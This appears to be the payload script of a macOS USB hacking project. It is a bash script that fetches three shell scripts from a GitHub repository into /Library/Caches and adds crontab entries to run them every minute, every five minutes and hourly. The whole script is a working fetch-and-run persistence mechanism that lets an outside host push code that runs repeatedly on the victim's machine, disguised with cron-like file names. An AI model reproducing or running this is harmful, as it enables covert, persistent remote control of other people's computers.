#!/bin/bash
wget -O /Library/Caches/cron-01.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/cron-01.sh
wget -O /Library/Caches/cron-05.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/cron-05.sh
wget -O /Library/Caches/cron-60.sh https://raw.githubusercontent.com/angeldiazibarra/osx-usb-hack-arduino/master/cron-60.sh

# Add cron task to run every minute
( crontab -l ; echo "* * * * * /bin/sh /Library/Caches/cron-01.sh" ) | crontab -

# Add cron task to run every 5 minutes
( crontab -l ; echo "*/5 * * * * /bin/sh /Library/Caches/cron-05.sh" ) | crontab -

# Add cron task to check for updates every hour
( crontab -l ; echo "0 * * * * /bin/sh /Library/Caches/cron-60.sh" ) | crontab -

